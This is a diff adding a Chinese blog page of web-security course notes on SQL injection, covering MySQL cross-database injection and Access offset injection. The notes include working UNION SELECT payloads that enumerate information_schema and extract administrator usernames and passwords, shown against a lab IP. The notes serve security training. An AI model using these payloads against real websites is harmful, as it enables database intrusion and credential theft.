@@ -1,0 +1,115 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="知识点：        本代码与数据库前置知识2、Access数据库注入-简易&amp;偏移3、MYSQL数据库注入-简易&amp;权限跨库                      前置知识：        -SQL注入漏洞产生原理分析-SQL注入漏洞危害利用分析-脚本代码与数据库操作流程-数据库名，表名，列名，数据-数据库类型，数据库用户，用户权限">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022-24-WEB攻防-通用漏洞&amp;SQL注入&amp;MYSQL跨库&amp;ACCESS偏移">
+<meta property="og:url" content="https://tupac-2pac.github.io/2022/02/28/2022-24-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E&SQL%E6%B3%A8%E5%85%A5&MYSQL%E8%B7%A8%E5%BA%93&ACCESS%E5%81%8F%E7%A7%BB/index.html">
+<meta property="og:site_name" content="Whoami">
+<meta property="og:description" content="知识点：        本代码与数据库前置知识2、Access数据库注入-简易&amp;偏移3、MYSQL数据库注入-简易&amp;权限跨库                      前置知识：        -SQL注入漏洞产生原理分析-SQL注入漏洞危害利用分析-脚本代码与数据库操作流程-数据库名，表名，列名，数据-数据库类型，数据库用户，用户权限">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s4.ax1x.com/2022/02/28/bKWbNQ.png">
+<meta property="article:published_time" content="2022-02-28T08:53:05.000Z">
+<meta property="article:modified_time" content="2022-02-28T09:04:51.100Z">
+<meta property="article:author" content="Whoami">
+<meta property="article:tag" content="迪哥2022WebSec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s4.ax1x.com/2022/02/28/bKWbNQ.png"><title>2022-24-WEB攻防-通用漏洞&amp;SQL注入&amp;MYSQL跨库&amp;ACCESS偏移 | Whoami</title><link ref="canonical" href="https://tupac-2pac.github.io/2022/02/28/2022-24-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E&amp;SQL%E6%B3%A8%E5%85%A5&amp;MYSQL%E8%B7%A8%E5%BA%93&amp;ACCESS%E5%81%8F%E7%A7%BB/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Whoami</div><div class="header-banner-info__subtitle">Life goes on</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">2022-24-WEB攻防-通用漏洞&amp;SQL注入&amp;MYSQL跨库&amp;ACCESS偏移</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-02-28</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-02-28</span></span></div></header><div class="post-body"><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/bKWbNQ"><img src="https://s4.ax1x.com/2022/02/28/bKWbNQ.png" alt="bKWbNQ.png"></a></p>
+
+        <h1 id="知识点："   >
+          <a href="#知识点：" class="heading-link"><i class="fas fa-link"></i></a><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1>
+      <blockquote>
+<p>本代码与数据库前置知识<br>2、Access数据库注入-简易&amp;偏移<br>3、MYSQL数据库注入-简易&amp;权限跨库</p>
+</blockquote>
+
+        <h1 id="前置知识："   >
+          <a href="#前置知识：" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h1>
+      <blockquote>
+<p>-SQL注入漏洞产生原理分析<br>-SQL注入漏洞危害利用分析<br>-脚本代码与数据库操作流程<br>-数据库名，表名，列名，数据<br>-数据库类型，数据库用户，用户权限</p>
+</blockquote>
+<blockquote>
+<p>脚本代码在实现代码与数据库进行数据通讯时（从数据库取出相关数据进行页面显示），将定义的SQL语句进行执行查询数据时。其中的SQL语句能通过参数传递自定义值来实现控制SQL语句，从而执行恶意的SQL语句，可以实现查询其他数据（数据库中的敏感数据，如管理员帐号密码）。这一个过程就可以叫做SQL注入漏洞。<br>漏洞产生根本条件：可控变量 特定函数</p>
+</blockquote>
+<blockquote>
+<p>如果下面的URL地址测试注入判断id有注入，手工测试该如何进行？<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://192.168.46.160:85/Production/PRODUCT.asp?id=1513&amp;page=1" >http://192.168.46.160:85/Production/PRODUCT.asp?id=1513&amp;page=1</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://192.168.46.160:85/Production/PRODUCT.asp?page=1&amp;id=1513" >http://192.168.46.160:85/Production/PRODUCT.asp?page=1&amp;id=1513</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>Production&#x2F;PRODUCT.asp?id&#x3D;1513 注入语句&amp;page&#x3D;1 对<br>Production&#x2F;PRODUCT.asp?id&#x3D;1513&amp;page&#x3D;1 注入语句 错</p>
+</blockquote>
+
+        <h1 id="SQL注入攻击流程："   >
+          <a href="#SQL注入攻击流程：" class="heading-link"><i class="fas fa-link"></i></a><a href="#SQL注入攻击流程：" class="headerlink" title="SQL注入攻击流程："></a>SQL注入攻击流程：</h1>
+      <blockquote>
+<p>1、猜测数据库类型<br>2、根据类型选择思路</p>
+</blockquote>
+
+        <h1 id="ACCESS-独立存在"   >
+          <a href="#ACCESS-独立存在" class="heading-link"><i class="fas fa-link"></i></a><a href="#ACCESS-独立存在" class="headerlink" title="ACCESS 独立存在"></a>ACCESS 独立存在</h1>
+      <blockquote>
+<p>数据库名<br>    表名<br>        列名<br>            数据</p>
+</blockquote>
+<blockquote>
+<p>MYSQL 统一管理<br>最高数据库用户&#x3D;root用户<br>数据库A&#x3D;网站A&#x3D;数据库用户A<br>    表名<br>        列名<br>            数据<br>数据库B&#x3D;网站B&#x3D;数据库用户B<br>数据库C&#x3D;网站C&#x3D;数据库用户C</p>
+</blockquote>
+<blockquote>
+<p>为了网站和数据库的安全性，MYSQL内置有ROOT最高用户，划分等级，每个用户对应管理一个数据库，这样保证无不关联，从而不会影响到其他数据库的运行。<br>MYSQL两种思路：<br>1、 非ROOT的注入攻击：常规类的猜解<br>2、 ROOT用户的注入攻击：文件读写操作，跨库查询注入等<br>黑盒测试中可以采用user()获取当前用户权限，白盒中看连接用户即可！</p>
+</blockquote>
+<p><strong>MYSQL5.0以上版本：自带的数据库名information_schema<br>information_schema：存储数据库下的数据库名及表名，列名信息的数据库<br>information_schema.tables：记录表名信息的表<br>information_schema.columns：记录列名信息表<br>information_schema.tables</strong></p>
+
+        <h1 id="获取相关数据："   >
+          <a href="#获取相关数据：" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取相关数据：" class="headerlink" title="获取相关数据："></a>获取相关数据：</h1>
+      <blockquote>
+<p>1、数据库版本-看是否符合information_schema查询-version()-5.5.532<br>2、数据库用户-看是否符合ROOT型注入攻击-user()-root@localhost<br>3、当前操作系统-看是否支持大小写或文件路径选择-@@version_compile_os-win<br>4、数据库名字-为后期猜解指定数据库下的表，列做准备-database()-syguestbook</p>
+</blockquote>
+
+        <h1 id="ROOT类型攻击-猜解数据，文件读写，跨库查询"   >
+          <a href="#ROOT类型攻击-猜解数据，文件读写，跨库查询" class="heading-link"><i class="fas fa-link"></i></a><a href="#ROOT类型攻击-猜解数据，文件读写，跨库查询" class="headerlink" title="ROOT类型攻击-猜解数据，文件读写，跨库查询"></a>ROOT类型攻击-猜解数据，文件读写，跨库查询</h1>
+      <blockquote>
+<p>获取syguestbook数据库下面的表名信息：<br>UNION SELECT table_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.tables where table_schema&#x3D;’syguestbook’<br>获取表名sy_adminuser的列名信息：<br>UNION SELECT column_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.columns where table_name&#x3D;’sy_adminuser’ and table_schema&#x3D;’syguestbook’<br>获取指定数据：<br>UNION SELECT username,password,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from sy_adminuser</p>
+</blockquote>
+
+        <h1 id="跨库注入：实现当前网站跨库查询其他数据库对应网站的数据"   >
+          <a href="#跨库注入：实现当前网站跨库查询其他数据库对应网站的数据" class="heading-link"><i class="fas fa-link"></i></a><a href="#跨库注入：实现当前网站跨库查询其他数据库对应网站的数据" class="headerlink" title="跨库注入：实现当前网站跨库查询其他数据库对应网站的数据"></a>跨库注入：实现当前网站跨库查询其他数据库对应网站的数据</h1>
+      <blockquote>
+<p>获取当前mysql下的所有数据库名<br>UNION SELECT schema_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.schemata<br>获取数据库名xhcms下的表名信息<br>UNION SELECT table_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.tables where table_schema&#x3D;’xhcms’<br>获取数据库名xhcms下的表manage下的列名信息：<br>UNION SELECT column_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.columns where table_name&#x3D;’manage’ and table_schema&#x3D;’xhcms’<br>获取指定数据：<br>UNION SELECT user,password,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from xhcms.manage</p>
+</blockquote>
+
+        <h1 id="ASP-Access-简易注入-字典猜解"   >
+          <a href="#ASP-Access-简易注入-字典猜解" class="heading-link"><i class="fas fa-link"></i></a><a href="#ASP-Access-简易注入-字典猜解" class="headerlink" title="ASP+Access-简易注入-字典猜解"></a>ASP+Access-简易注入-字典猜解</h1>
+      <blockquote>
+<p>由于Access数据库特性导致这个SQL注入是需要借助字典去猜解表名和列名的，那么就会出现表名或列名猜解不到，可以自定义社工字典或采用偏移注入！</p>
+</blockquote>
+
+        <h1 id="ASP-Access-偏移注入-报错显示"   >
+          <a href="#ASP-Access-偏移注入-报错显示" class="heading-link"><i class="fas fa-link"></i></a><a href="#ASP-Access-偏移注入-报错显示" class="headerlink" title="ASP+Access-偏移注入-报错显示"></a>ASP+Access-偏移注入-报错显示</h1>
+      <blockquote>
+<p>偏移注入就是解决表名已知，列名未知的情况！</p>
+</blockquote>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://tupac-2pac.github.io">Whoami</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="https://tupac-2pac.github.io/2022/02/28/2022-24-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E&amp;SQL%E6%B3%A8%E5%85%A5&amp;MYSQL%E8%B7%A8%E5%BA%93&amp;ACCESS%E5%81%8F%E7%A7%BB/">https://tupac-2pac.github.io/2022/02/28/2022-24-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E&amp;SQL%E6%B3%A8%E5%85%A5&amp;MYSQL%E8%B7%A8%E5%BA%93&amp;ACCESS%E5%81%8F%E7%A7%BB/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://tupac-2pac.github.io/tags/%E8%BF%AA%E5%93%A52022WebSec/">迪哥2022WebSec</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/02/28/2022-25-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E&amp;SQL%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5&amp;MYSQL&amp;MSSQL&amp;PostgreSQL/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">2022-25-WEB攻防-通用漏洞&amp;SQL读写注入&amp;MYSQL&amp;MSSQL&amp;PostgreSQL</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2022/02/28/2022-23-WEB%E6%94%BB%E9%98%B2-Python%E8%80%83%E7%82%B9&amp;CTF%E4%B8%8ECMS-SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5&amp;PYC%E5%8F%8D%E7%BC%96%E8%AF%91/"><span class="paginator-prev__text">2022-23-WEB攻防-Python考点&amp;CTF与CMS-SSTI模版注入&amp;PYC反编译</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">
+          知识点：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">
+          前置知识：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">
+          SQL注入攻击流程：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACCESS-%E7%8B%AC%E7%AB%8B%E5%AD%98%E5%9C%A8"><span class="toc-number">4.</span> <span class="toc-text">
+          ACCESS 独立存在</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%9B%B8%E5%85%B3%E6%95%B0%E6%8D%AE%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">
+          获取相关数据：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ROOT%E7%B1%BB%E5%9E%8B%E6%94%BB%E5%87%BB-%E7%8C%9C%E8%A7%A3%E6%95%B0%E6%8D%AE%EF%BC%8C%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%EF%BC%8C%E8%B7%A8%E5%BA%93%E6%9F%A5%E8%AF%A2"><span class="toc-number">6.</span> <span class="toc-text">
+          ROOT类型攻击-猜解数据，文件读写，跨库查询</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B7%A8%E5%BA%93%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%AE%9E%E7%8E%B0%E5%BD%93%E5%89%8D%E7%BD%91%E7%AB%99%E8%B7%A8%E5%BA%93%E6%9F%A5%E8%AF%A2%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%B9%E5%BA%94%E7%BD%91%E7%AB%99%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="toc-number">7.</span> <span class="toc-text">
+          跨库注入：实现当前网站跨库查询其他数据库对应网站的数据</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ASP-Access-%E7%AE%80%E6%98%93%E6%B3%A8%E5%85%A5-%E5%AD%97%E5%85%B8%E7%8C%9C%E8%A7%A3"><span class="toc-number">8.</span> <span class="toc-text">
+          ASP+Access-简易注入-字典猜解</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ASP-Access-%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%98%BE%E7%A4%BA"><span class="toc-number">9.</span> <span class="toc-text">
+          ASP+Access-偏移注入-报错显示</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/assets/xigonxiaozi.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">一个平凡的梦想.</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">24</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">1</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">5</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Whoami</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
